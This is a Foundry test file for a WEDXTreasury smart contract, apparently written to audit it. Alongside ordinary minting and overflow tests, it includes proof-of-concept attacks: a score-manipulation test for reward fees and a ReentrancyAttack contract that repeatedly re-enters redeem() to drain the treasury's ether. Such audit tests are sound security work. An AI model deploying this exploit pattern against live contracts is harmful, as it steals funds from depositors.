// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "../contracts/WEDXTreasury.sol";
import "../contracts/IWEDXInterfaces.sol";
import "./mocks/MockWEDXManager.sol";
import "./mocks/MockWEDXGroup.sol";

contract WEDXTreasuryest is Test {
    WEDXTreasury treasury;
    MockWEDXGroup mockWEDXGroup;
    MockWEDXManager mockWEDXManager;
    ReentrancyAttack attacker;
    address payable thirdParty;
    address payable alice = payable(vm.addr(1));


    event Log(string message, uint256 value);

    function setUp() public {
        mockWEDXManager = new MockWEDXManager();
        mockWEDXGroup = new MockWEDXGroup(address(mockWEDXManager));
        treasury = new WEDXTreasury();
        attacker = new ReentrancyAttack(payable(address(treasury)));
        thirdParty = payable(address(0x1234)); // Third party address
    }
    
    // Test 1: Verify minting with depositGeneralFee
    function testDepositGeneralFee() public {
        IWEDXGroup wedxGroup = IWEDXGroup(address(mockWEDXGroup));
        address owner = wedxGroup.owner();
        uint256 initialBalance = treasury.balanceOf(owner);

        vm.deal(address(this), 1 ether); // Provide 1 ether to the test contract
        treasury.depositGeneralFee{value: 1 ether}();

        uint256 finalBalance = treasury.balanceOf(owner);

        assertEq(finalBalance, initialBalance + 1 ether, "Incorrect minting in depositGeneralFee");
    }

    // Test 2: Verify minting with receive
    function testReceive() public {
        IWEDXGroup wedxGroup = IWEDXGroup(address(mockWEDXGroup));
        address owner = wedxGroup.owner();
        uint256 initialBalance = treasury.balanceOf(owner);

        vm.deal(address(treasury), 1 ether); // Send 1 ether to the contract
        (bool success, ) = address(treasury).call{value: 1 ether}("");
        require(success, "Ether send failed");

        uint256 finalBalance = treasury.balanceOf(owner);

        assertEq(finalBalance, initialBalance + 1 ether, "Incorrect minting in receive");
    }

    // Test 3: Verify ranking score manipulation in depositRewardFee
    function testRewardManipulation() public {
        mockWEDXManager.setTraderScore(address(this), 1000); // Manipulate score

        treasury.depositRewardFee{value: 1 ether}();

        uint256 attackerBalance = treasury.balanceOf(address(this));

        assertGt(attackerBalance, 0, "The attacker did not receive tokens");
    }

// Test 4: Demonstrate a possible reentrancy attack in redeem
function testReentrancy() public {
    // Provide funds to the attacker contract
    vm.deal(address(attacker), 4 ether);
    deal(address(treasury), address(attacker), 5 ether);
    // treasury.depositGeneralFee{value: 4 ether}();
    attacker.depositfirst{value: 4 ether}();

    // Provide funds to the treasury contract from a third-party account
    vm.deal(address(alice), 4 ether);
    deal(address(treasury), address(alice), 5 ether);
    vm.prank(alice);
    treasury.depositGeneralFee{value: 4 ether}();

    uint256 initialTreasuryBalance = address(treasury).balance;
    uint256 initialAttackerBalance = address(attacker).balance;
    uint256 initialThirdPartyBalance = address(alice).balance;

    emit Log("Initial Treasury Balance", initialTreasuryBalance);
    emit Log("Initial Attacker Balance", initialAttackerBalance);
    emit Log("Initial Alice Balance", initialThirdPartyBalance);

    console2.log("initialTreasuryBalance", initialTreasuryBalance);
    console2.log("initialAttackerBalance", initialAttackerBalance);
    console2.log("Initial Alice Balance", initialThirdPartyBalance);

    // Perform reentrancy attack
    attacker.attack{value: 1 ether}();

    uint256 finalTreasuryBalance = address(treasury).balance;
    uint256 finalAttackerBalance = address(attacker).balance;
    uint256 finalThirdPartyBalance = address(alice).balance;

    emit Log("Final Treasury Balance", finalTreasuryBalance);
    emit Log("Final Attacker Balance", finalAttackerBalance);
    emit Log("Final Alice Balance", finalThirdPartyBalance);

    console2.log("finalTreasuryBalance", finalTreasuryBalance);
    console2.log("finalAttackerBalance", finalAttackerBalance);
    console2.log("Final Alice Balance", finalThirdPartyBalance);

    assertLt(finalTreasuryBalance, initialTreasuryBalance, "Reentrancy attack failed");
    assertGt(finalAttackerBalance, initialAttackerBalance, "The attacker did not gain funds");

    // Attempt to withdraw funds from Alice after the attack
    vm.prank(alice);
    (bool withdrew,) = address(treasury).call(abi.encodeWithSignature("redeem(uint256)", 1 ether));
    emit Log("Third Party Withdraw Attempt", withdrew ? 1 : 0);

    console2.log("Third Party Withdraw Attempt", withdrew ? 1 : 0);
}


    // Test 5: Verify that the minted token amount does not exceed the Ether sent
    function testMintingExactAmount() public {
        IWEDXGroup wedxGroup = IWEDXGroup(address(mockWEDXGroup));
        address owner = wedxGroup.owner();

        vm.deal(address(this), 1 ether);
        treasury.depositGeneralFee{value: 1 ether}();
        uint256 balance = treasury.balanceOf(owner);
        assertEq(balance, 1 ether, "Incorrect amount of tokens minted");
    }

    // Test 6: Verify that tokens cannot be minted without sending Ether
    function testNoMintingWithoutEther() public {
        IWEDXGroup wedxGroup = IWEDXGroup(address(mockWEDXGroup));
        address owner = wedxGroup.owner();

        uint256 initialBalance = treasury.balanceOf(owner);
        treasury.depositGeneralFee{value: 0}();
        uint256 finalBalance = treasury.balanceOf(owner);

        assertEq(finalBalance, initialBalance, "Tokens were minted without sending Ether");
    }

    // Test 7: Verify that there is no overflow in token minting
    function testMintingOverflow() public {
        IWEDXGroup wedxGroup = IWEDXGroup(address(mockWEDXGroup));
        address owner = wedxGroup.owner();

        // Try to mint a large amount of Ether to see if there is overflow
        uint256 largeAmount = type(uint256).max;
        vm.deal(address(this), largeAmount);

        try treasury.depositGeneralFee{value: largeAmount}() {
            uint256 finalBalance = treasury.balanceOf(owner);
            assertEq(finalBalance, largeAmount, "Overflow in token minting");
        } catch {
            // If there is an exception, it means there is overflow protection
            assertTrue(true, "Overflow protection present");
        }
    }

    // Test 8: Verify that there is no reentrancy in the depositRewardFee function
    function testDepositRewardFeeReentrancy() public {
        // Provide funds to the treasury contract
        vm.deal(address(treasury), 1 ether);
        assertEq(address(treasury).balance, 1 ether, "The treasury did not receive funds");

        vm.deal(address(attacker), 1 ether);
        uint256 initialTreasuryBalance = address(treasury).balance;
        uint256 initialAttackerBalance = address(attacker).balance;

        emit Log("Initial Treasury Balance", initialTreasuryBalance);
        emit Log("Initial Attacker Balance", initialAttackerBalance);

        console2.log("initialTreasuryBalance", initialTreasuryBalance);
        console2.log("initialAttackerBalance", initialAttackerBalance);

        attacker.attackRewardFee{value: 1 ether}();

        uint256 finalTreasuryBalance = address(treasury).balance;
        uint256 finalAttackerBalance = address(attacker).balance;

        emit Log("Final Treasury Balance", finalTreasuryBalance);
        emit Log("Final Attacker Balance", finalAttackerBalance);

        console2.log("finalTreasuryBalance", finalTreasuryBalance);
        console2.log("finalAttackerBalance", finalAttackerBalance);

        assertLt(finalTreasuryBalance, initialTreasuryBalance, "Reentrancy attack failed");
        assertGt(finalAttackerBalance, initialAttackerBalance, "The attacker did not gain funds");
    }
}

// Reentrancy attack contract
contract ReentrancyAttack {
    WEDXTreasury public treasury;
    bool public attacked;
    uint256 public attackCount;
    event Log(string message, uint256 value);
    event LogAttackIteration(uint256 iteration, uint256 treasuryBalance, uint256 attackerBalance);

    constructor(address payable _treasury) {
        treasury = WEDXTreasury(_treasury);
    }

    receive() external payable {
        if (!attacked && address(treasury).balance >= 1 ether) {
            emit Log("Reentrancy attack triggered", address(treasury).balance);
            attacked = true;
            for (uint256 i = 0; i < 4; i++) { // Iterate multiple times to demonstrate the attack
                console2.log("Iteration", i);
                console2.log("Treasury balance before redeem", address(treasury).balance);
                console2.log("Attacker balance before redeem", address(this).balance);
                console2.log("Treasury token balance before redeem", treasury.balanceOf(address(this)));
                treasury.redeem(1 ether);
                console2.log("Treasury balance after redeem", address(treasury).balance);
                console2.log("Attacker balance after redeem", address(this).balance);
                console2.log("Treasury token balance after redeem", treasury.balanceOf(address(this)));
            }
        }
    }

    function attack() external payable {
        emit Log("Starting reentrancy attack", msg.value);
        treasury.depositGeneralFee{value: msg.value}();
        treasury.redeem(1 ether);
    }

    function depositfirst() public payable {
        treasury.depositGeneralFee{value: msg.value}();
    }

    function attackRewardFee() external payable {
        emit Log("Starting reentrancy attack on depositRewardFee", msg.value);
        treasury.depositRewardFee{value: msg.value}();
    }
}
